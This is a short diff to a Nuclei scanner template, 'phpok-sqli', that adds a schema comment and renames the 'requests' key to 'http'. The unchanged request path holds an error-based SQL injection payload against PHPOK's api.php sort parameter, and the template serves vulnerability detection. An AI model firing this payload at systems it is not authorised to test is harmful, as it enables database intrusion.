@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: phpok-sqli
 
 info:
@@ -12,7 +13,7 @@ info:
 variables:
   num: "999999999"
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+'
